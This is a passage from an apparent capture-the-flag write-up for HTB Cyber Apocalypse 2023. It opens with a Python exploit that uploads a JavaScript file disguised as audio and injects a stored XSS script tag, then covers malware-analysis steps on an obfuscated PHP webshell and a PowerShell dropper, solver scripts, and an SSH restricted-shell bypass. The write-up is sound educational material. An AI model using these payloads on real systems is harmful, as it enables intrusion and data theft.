<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# SpyBug - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span>

<span class="n">api</span> <span class="o">=</span> <span class="s">"http://139.59.173.68:31674"</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Registering agent..."</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/register"</span><span class="p">).</span><span class="n">text</span><span class="p">)</span>
<span class="nb">id</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"identifier"</span><span class="p">]</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] id: </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="se">\n</span><span class="s">[+] token: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Uploading payload..."</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">api</span> <span class="o">+</span> <span class="s">"/uploads/"</span> <span class="o">+</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/upload/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">'recording'</span><span class="p">:</span> <span class="p">(</span><span class="s">'payload.wav'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload.js'</span><span class="p">),</span> <span class="s">'audio/wave'</span><span class="p">)}).</span><span class="n">text</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Payload uploaded to: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Injecting XSS payload..."</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/details/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"hostname"</span><span class="p">:</span><span class="s">"&lt;script src='/uploads/"</span> <span class="o">+</span> <span class="n">url</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"'&gt;&lt;/script&gt;"</span><span class="p">,</span> <span class="s">"platform"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">,</span> <span class="s">"arch"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">}).</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The exploit ran successfully;</p>

<p><img src="/assets/img/20230323132828.png" alt="" /></p>

<p>After a few seconds, I got a callback;</p>

<p><img src="/assets/img/20230323132919.png" alt="" /></p>

<p>The decoded base64 contains the flag;</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container login mt-5 mb-5"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-10"</span><span class="nt">&gt;&lt;h1&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-satellite-dish"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Spybug v1<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2 float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"btn login-btn mt-3"</span> <span class="na">href=</span><span class="s">"/panel/logout"</span><span class="nt">&gt;</span>Log-out<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;hr&gt;&lt;h2&gt;</span>Welcome back HTB{p01yg10t5_4nd_35p10n4g3}<span class="nt">&lt;/h2&gt;&lt;hr&gt;&lt;h3&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-laptop"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Agents<span class="nt">&lt;/h3&gt;&lt;table</span> <span class="na">class=</span><span class="s">"w-100"</span><span class="nt">&gt;&lt;thead&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;</span>ID<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Hostname<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Platform<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Arch<span class="nt">&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;</span>7ecf63f2-25bb-45f2-9a7a-54fd3583bda5<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;script </span><span class="na">src=</span><span class="s">"/uploads/a6f135d0-aed4-47eb-a374-b42c91b9553f"</span><span class="nt">&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="forensics">Forensics</h3>
<p><br /></p>

<h4 id="roten">Roten</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>Downloaded files contain a PCAP file;</p>

<p><img src="/assets/img/20230323134144.png" alt="" /></p>

<p>Loading it up in wireshark and setting a filter to only show HTTP traffic showed lots of <code class="language-plaintext highlighter-rouge">404</code> responses, which is common in web bruteforce;</p>

<p><img src="/assets/img/20230323134332.png" alt="" /></p>

<p>Following the HTTP stream confirmed this as the <em>User-Agent</em> was that of <code class="language-plaintext highlighter-rouge">wfuzz</code>, a web fuzzer;</p>

<p><img src="/assets/img/20230323134622.png" alt="" /></p>

<p>This could be the attacker. Searching for POST requests found one for a PHP file;</p>

<p><img src="/assets/img/20230323135221.png" alt="" /></p>

<p><img src="/assets/img/20230323135342.png" alt="" /></p>

<p>The PHP file was obfuscated. At the last line, it calls <code class="language-plaintext highlighter-rouge">eval()</code> to execute the payload after self-deobfuscation. I replaced <code class="language-plaintext highlighter-rouge">eval</code> with <code class="language-plaintext highlighter-rouge">echo</code>, which simply prints the decoded payload. The flag was inside;</p>

<p><img src="/assets/img/20230323135602.png" alt="" /></p>

<p><br /></p>

<h4 id="packet-cyclone">Packet Cyclone</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>The downloaded files contain some <code class="language-plaintext highlighter-rouge">.evtx</code> log files. I installed <code class="language-plaintext highlighter-rouge">libevtx-utils</code>, which provides <code class="language-plaintext highlighter-rouge">evtxexport</code> for reading <code class="language-plaintext highlighter-rouge">.evtx</code> files on linux. The file <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Sysmon%4Operational.evtx</code> contains the <em>sysmon</em> event logs, and was exported using;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>extxexport Microsoft-Windows-Sysmon%4Operational.evtx <span class="o">&gt;</span> sysmon.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I loaded the <code class="language-plaintext highlighter-rouge">sysmon.txt</code> file and the rules in <code class="language-plaintext highlighter-rouge">sigma_rules/</code> for guidance, and was able to answer the questions;</p>

<p><img src="/assets/img/20230323144838.png" alt="" /></p>

<p><br /></p>

<h4 id="relic-maps">Relic Maps</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<blockquote>
  <p>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).</p>
</blockquote>

<p>No downloadables for this challenge, so it starts blind. Using curl, I downloaded the file linked above. <code class="language-plaintext highlighter-rouge">file</code> could not identify it’s type;</p>

<p><img src="/assets/img/20230323141307.png" alt="" /></p>

<p>Running <code class="language-plaintext highlighter-rouge">strings</code> on the file revealed some commands that reference 2 interesting URLs;</p>

<p><img src="/assets/img/20230323141450.png" alt="" /></p>

<p>The files were downloaded. <code class="language-plaintext highlighter-rouge">topsecret-maps.one</code> is another blob, but <code class="language-plaintext highlighter-rouge">window.bat</code> is an obfuscated batch file with some base64 encoded blobs;</p>

<p><img src="/assets/img/20230323141612.png" alt="" /></p>

<p>This <a href="https://github.com/DissectMalware/batch_deobfuscator">batch deobfuscator</a> did a great job of making the file more readable. After a bit of manual cleanup, it became obvious that the batch file is using <em>powershell</em> to decrypt, decompress, and execute a payload. The segment of interest is;</p>

<p><img src="/assets/img/20230323142721.png" alt="" /></p>

<p>As you can see above;</p>
<ul>
  <li>Line <code class="language-plaintext highlighter-rouge">1 - 7</code> - Loads a file named <code class="language-plaintext highlighter-rouge">script.bat</code>, split it based on newlines, and select all lines that starts with <code class="language-plaintext highlighter-rouge">:: </code></li>
  <li>Line <code class="language-plaintext highlighter-rouge">8</code> - Base64 decode the lines selected above</li>
  <li>Line <code class="language-plaintext highlighter-rouge">9 - 13</code> - Initialize an AES cipher with;
    <ul>
      <li>Mode: CBC</li>
      <li>IV: <code class="language-plaintext highlighter-rouge">2hn/J717js1MwdbbqMn7Lw==</code></li>
      <li>Key: <code class="language-plaintext highlighter-rouge">0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=</code></li>
    </ul>
  </li>
</ul>

<p>The above information is enough to decrypt the payload in <code class="language-plaintext highlighter-rouge">script.bat</code>, but we do not have access to the file. However, the deobfuscated <code class="language-plaintext highlighter-rouge">window.bat</code> file does have a line that starts with <code class="language-plaintext highlighter-rouge">:: </code> + a long base64 encoded blob;</p>

<p><img src="/assets/img/20230323143256.png" alt="" /></p>

<p>So I copied it and head over to <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, and was able to decrypt it using the following recipe;</p>

<p><img src="/assets/img/20230323143734.png" alt="" /></p>

<p>I decoded the base64 encoded output from Cyber Chef and saved it locally. <code class="language-plaintext highlighter-rouge">file</code> identified it as <code class="language-plaintext highlighter-rouge">gzip</code>, but was unable to extract;</p>

<p><img src="/assets/img/20230323143934.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">binwalk</code> however has no such weakness, and was able to extract the file, which was indentified as a 32-bit windows executable;</p>

<p><img src="/assets/img/20230323144103.png" alt="" /></p>

<p>Loading the binary in <em>radare2</em> and dumping the strings table revealed the flag;</p>

<p><img src="/assets/img/20230323144304.png" alt="" /></p>

<p>This could also be accomplished by running <code class="language-plaintext highlighter-rouge">strings</code> in 16-bit little endian mode;</p>

<p><img src="/assets/img/20230323144417.png" alt="" /></p>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="rev">Rev</h3>
<p><br /></p>

<h4 id="she-shells-c-shells">She Shells C Shells</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p><img src="/assets/img/20230323145404.png" alt="" /></p>

<p>A bit of reversing revealed the logic used in password validation inside the function <code class="language-plaintext highlighter-rouge">func_flag()</code>;</p>

<p><img src="/assets/img/20230323150650.png" alt="" /></p>

<p>The above translate to;</p>

<pre><code class="language-C">fgets(_password_entered, 256, stdin);
for ( i = 0; i &lt;= 0x4C; ++i )
  _password_entered[i] ^= m1[i];
if ( memcmp(_password_entered, &amp;t, 0x4DuLL) )
  return 0xFFFFFFFFLL;
for ( j = 0; j &lt;= 0x4C; ++j )
  _password_entered[j] ^= m2[j];
printf("Flag: %s\n", _password_entered);
return 0LL;
</code></pre>

<p>Setting a breakpoint and stepping through the function;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">m1</code> - <code class="language-plaintext highlighter-rouge">6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d</code></li>
  <li><code class="language-plaintext highlighter-rouge">t</code> - <code class="language-plaintext highlighter-rouge">2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
  <li><code class="language-plaintext highlighter-rouge">m2</code> - <code class="language-plaintext highlighter-rouge">641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
</ul>

<p>Note that <code class="language-plaintext highlighter-rouge">0x4c</code> (76) is the highest index used in the loop, meaning our passkey is a maximum of <strong>77</strong> characters long.</p>

<p>Knowing this, I wrote a script to crack it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------
# She Shells C Shells - Cyber Apocalypse 2023 solution.
#                                       Author: 4g3nt47
#------------------------------------------------------
</span>
<span class="n">m1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d"</span><span class="p">)</span>
<span class="n">t</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>
<span class="n">m2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>

<span class="n">plain_pass</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">77</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">m1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
      <span class="n">plain_pass</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
      <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] plain_pass: "</span> <span class="o">+</span> <span class="n">plain_pass</span><span class="p">)</span>
<span class="n">plain_pass</span> <span class="o">=</span> <span class="n">plain_pass</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">):</span>
  <span class="n">flag</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">m2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] flag: "</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323151608.png" alt="" /></p>

<p><br /></p>

<h4 id="hunting-license">Hunting License</h4>
<p><br /></p>

<ul>
  <li>DIfficulty: <em>easy</em></li>
</ul>

<p>This is a Q&amp;A based challenge. Binary on server differs with the one given to players. Solved all questions after a bit of reversing;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#--------------------------------------------------
# Hunting License - Cyber Apocalypse 2023 solution.
#                                   Author: 4g3nt47
#--------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"477b7a6177527d77557a7d727f323232"</span><span class="p">)</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
  <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mi">19</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"165.232.98.6"</span><span class="p">,</span> <span class="mi">31978</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"elf"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"x86-64"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"libreadline"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0x401172"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"5"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"PasswordNumeroUno"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0wTdr0wss4P"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"P4ssw0rdTw0"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"19"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">decoded</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"}`"</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="misc">Misc</h3>
<p><br /></p>

<h4 id="persistence">Persistence</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<blockquote>
  <p>Thousands of years ago, sending a GET request to <strong>/flag</strong> would grant immense power and wisdom. Now it’s broken and usually returns random data, but keep trying, and you might get lucky… Legends say it works once every 1000 tries.</p>
</blockquote>

<p>From the above description, it’s clear that this is a bruteforce challenge. So I wrote a script to deal with it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#----------------------------------------------
# Persistence - Cyber Apocalypse 2023 solution.
#                               Author: 4g3nt47
#----------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1"># print("[*] Trying...")
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://206.189.112.129:30585/flag"</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">"HTB"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Flag: </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">break</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_flag</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] Flag: HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="restricted">Restricted</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Dockerfile</code> showed a user <code class="language-plaintext highlighter-rouge">restricted</code> created without a password;</p>

<p><img src="/assets/img/20230323153510.png" alt="" /></p>

<p>I was able to login over SSH without password;</p>

<p><img src="/assets/img/20230323153630.png" alt="" /></p>

<p>Can’t run many commands. <code class="language-plaintext highlighter-rouge">PATH</code> is marked read-only, and set to <code class="language-plaintext highlighter-rouge">/home/restricted/.bin</code> as defined in <code class="language-plaintext highlighter-rouge">bash_profile</code> used to setup the user. Can’t also use <code class="language-plaintext highlighter-rouge">/</code> in command names, so can’t supply full paths;</p>

<p><img src="/assets/img/20230323154018.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">.bash_profile</code> is only loaded after a normal shell login, we could bypass this by passing commands to execute as string arguments to the SSH binary. This way, <code class="language-plaintext highlighter-rouge">.bash_profile</code> is never loaded;</p>

<p><img src="/assets/img/20230323154255.png" alt="" /></p>

<p><br /></p>

<h4 id="remote-computation">Remote Computation</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>The alien species use remote machines for all their computation needs. Pandora managed to hack into one, but broke its functionality in the process. Incoming computation requests need to be calculated and answered rapidly, in order to not alarm the aliens and ultimately pivot to other parts of their network. Not all requests are valid though, and appropriate error messages need to be sent depending on the type of error. Can you buy us some time by correctly responding to the next 500 requests?</p>
</blockquote>

<p>This seems to be a programming exercise. Connecting to the service, there is a help menu that explains all the requirements;</p>

<p><img src="/assets/img/20230323154650.png" alt="" /></p>

<p>Knowing this, I wrote a script to automate this;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------------------
# Remote Computation - Cyber Apocalypse 2023 solution.
#                                      Author: 4g3nt47
#-----------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.59.176.230"</span><span class="p">,</span> <span class="mi">30021</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
